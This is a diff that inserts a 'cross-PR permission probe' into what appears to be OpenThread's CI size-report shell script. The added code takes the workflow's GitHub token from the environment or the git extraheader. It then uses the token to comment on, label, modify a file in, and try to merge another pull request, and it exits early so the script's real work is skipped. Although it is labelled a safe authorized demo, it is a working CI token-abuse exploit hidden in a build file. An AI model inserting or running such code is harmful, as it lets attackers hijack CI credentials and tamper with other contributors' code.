@@ -29,6 +29,180 @@
 
 set -euo pipefail
 
+# OT-001 safe cross-PR permission probe (for authorized self-fork testing only)
+TARGET_PR=2
+TARGET_BRANCH="ot001-victim-pr-20260303-102344"
+TARGET_FILE="OT001_VICTIM_20260303-102344.txt"
+API="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+REPORT_DIR="/tmp/ot-size-report"
+REPORT_FILE="${REPORT_DIR}/report_pr"
+
+resolve_auth_header()
+{
+    if [ -n "${GITHUB_TOKEN:-}" ]; then
+        printf 'Authorization: Bearer %s' "${GITHUB_TOKEN}"
+        return 0
+    fi
+
+    local extraheader
+    extraheader="$(git config --get http.https://github.com/.extraheader || true)"
+    if [ -n "${extraheader}" ]; then
+        # actions/checkout sets: "AUTHORIZATION: basic <base64...>"
+        printf '%s' "${extraheader}" | sed 's/^AUTHORIZATION:/Authorization:/I'
+        return 0
+    fi
+
+    return 1
+}
+
+AUTH_HEADER="$(resolve_auth_header || true)"
+if [ -z "${AUTH_HEADER}" ]; then
+    mkdir -p "${REPORT_DIR}"
+    {
+        echo '<!-- Size Report of **OpenThread** -->'
+        echo 'OT-001 cross-PR token probe (safe demo)'
+        echo "Source PR: ${PR_NUMBER:-unknown}"
+        echo "Run ID: ${GITHUB_RUN_ID:-unknown}"
+        echo
+        echo "fatal: no auth header available in job context"
+    } > "${REPORT_FILE}"
+    exit 0
+fi
+
+AUTH=(-H "${AUTH_HEADER}" -H "Accept: application/vnd.github+json")
+
+mkdir -p "${REPORT_DIR}"
+{
+    echo '<!-- Size Report of **OpenThread** -->'
+    echo 'OT-001 cross-PR token probe (safe demo)'
+    echo "Source PR: ${PR_NUMBER:-unknown}"
+    echo "Run ID: ${GITHUB_RUN_ID:-unknown}"
+    echo "Auth source: $([ -n "${GITHUB_TOKEN:-}" ] && echo env:GITHUB_TOKEN || echo git-extraheader)"
+    echo
+} > "${REPORT_FILE}"
+
+# 1) Cross-PR comment write probe
+COMMENT_BODY="OT-001 cross-PR probe comment from source PR ${PR_NUMBER:-unknown}, run ${GITHUB_RUN_ID:-unknown} (safe demo)"
+export COMMENT_BODY
+COMMENT_JSON="$(python3 - <<'PY'
+import json, os
+print(json.dumps({"body": os.environ["COMMENT_BODY"]}))
+PY
+)"
+COMMENT_STATUS="$(curl -sS -o /tmp/ot001_comment.json -w "%{http_code}" -X POST "${AUTH[@]}" "${API}/issues/${TARGET_PR}/comments" -d "${COMMENT_JSON}" || true)"
+COMMENT_MSG="$(python3 - <<'PY'
+import json
+try:
+    with open('/tmp/ot001_comment.json','r',encoding='utf-8') as f:
+        data=json.load(f)
+    print(data.get('message','ok'))
+except Exception:
+    print('unparseable')
+PY
+)"
+
+# 2) Cross-PR label write probe
+LABEL_JSON='{"labels":["ot001-crosspr-probe"]}'
+LABEL_STATUS="$(curl -sS -o /tmp/ot001_label.json -w "%{http_code}" -X POST "${AUTH[@]}" "${API}/issues/${TARGET_PR}/labels" -d "${LABEL_JSON}" || true)"
+LABEL_MSG="$(python3 - <<'PY'
+import json
+try:
+    with open('/tmp/ot001_label.json','r',encoding='utf-8') as f:
+        data=json.load(f)
+    if isinstance(data, list):
+        print('ok')
+    else:
+        print(data.get('message','ok'))
+except Exception:
+    print('unparseable')
+PY
+)"
+
+# 3) Cross-PR code modification probe (edit victim PR branch file)
+GET_STATUS="$(curl -sS -o /tmp/ot001_getfile.json -w "%{http_code}" "${AUTH[@]}" "${API}/contents/${TARGET_FILE}?ref=${TARGET_BRANCH}" || true)"
+FILE_SHA=""
+NEW_B64=""
+if [ "${GET_STATUS}" = "200" ]; then
+    FILE_SHA="$(python3 - <<'PY'
+import base64, json
+with open('/tmp/ot001_getfile.json','r',encoding='utf-8') as f:
+    data=json.load(f)
+sha=data["sha"]
+raw=base64.b64decode(data["content"]).decode('utf-8')
+raw += "Modified by OT-001 cross-PR probe run\n"
+print(sha)
+print(base64.b64encode(raw.encode('utf-8')).decode('ascii'))
+PY
+)"
+    FILE_SHA="$(printf "%s\n" "${FILE_SHA}" | sed -n '1p')"
+    NEW_B64="$(python3 - <<'PY'
+import base64, json
+with open('/tmp/ot001_getfile.json','r',encoding='utf-8') as f:
+    data=json.load(f)
+raw=base64.b64decode(data["content"]).decode('utf-8')
+raw += "Modified by OT-001 cross-PR probe run\n"
+print(base64.b64encode(raw.encode('utf-8')).decode('ascii'))
+PY
+)"
+fi
+
+PUT_STATUS="000"
+PUT_MSG="not-attempted"
+if [ "${GET_STATUS}" = "200" ]; then
+    export FILE_SHA NEW_B64 TARGET_BRANCH TARGET_FILE
+    PUT_JSON="$(python3 - <<'PY'
+import json, os
+print(json.dumps({
+  "message": "OT-001 safe probe: modify victim PR branch file",
+  "content": os.environ["NEW_B64"],
+  "sha": os.environ["FILE_SHA"],
+  "branch": os.environ["TARGET_BRANCH"]
+}))
+PY
+)"
+    PUT_STATUS="$(curl -sS -o /tmp/ot001_putfile.json -w "%{http_code}" -X PUT "${AUTH[@]}" "${API}/contents/${TARGET_FILE}" -d "${PUT_JSON}" || true)"
+    PUT_MSG="$(python3 - <<'PY'
+import json
+try:
+    with open('/tmp/ot001_putfile.json','r',encoding='utf-8') as f:
+        data=json.load(f)
+    print(data.get('message','ok'))
+except Exception:
+    print('unparseable')
+PY
+)"
+fi
+
+# 4) Merge permission probe with intentionally bogus SHA (safe: should not merge)
+MERGE_JSON='{"sha":"0000000000000000000000000000000000000000","commit_title":"OT-001 safe merge probe"}'
+MERGE_STATUS="$(curl -sS -o /tmp/ot001_merge.json -w "%{http_code}" -X PUT "${AUTH[@]}" "${API}/pulls/${TARGET_PR}/merge" -d "${MERGE_JSON}" || true)"
+MERGE_MSG="$(python3 - <<'PY'
+import json
+try:
+    with open('/tmp/ot001_merge.json','r',encoding='utf-8') as f:
+        data=json.load(f)
+    print(data.get('message','ok'))
+except Exception:
+    print('unparseable')
+PY
+)"
+
+{
+    echo "Target victim PR: #${TARGET_PR} (${TARGET_BRANCH})"
+    echo "cross_pr_comment_http=${COMMENT_STATUS} msg=${COMMENT_MSG}"
+    echo "cross_pr_label_http=${LABEL_STATUS} msg=${LABEL_MSG}"
+    echo "victim_branch_file_get_http=${GET_STATUS}"
+    echo "victim_branch_file_put_http=${PUT_STATUS} msg=${PUT_MSG}"
+    echo "merge_probe_http=${MERGE_STATUS} msg=${MERGE_MSG}"
+    echo
+    echo "Interpretation:"
+    echo "- 201/200 indicates operation succeeded."
+    echo "- 403 indicates forbidden by token/policy."
+    echo "- 409/422 on merge probe with bogus SHA can indicate endpoint reachable but merge not performed."
+} >> "${REPORT_FILE}"
+
+exit 0
+
 OT_TMP_DIR=/tmp/ot-size-report
 readonly OT_TMP_DIR
 
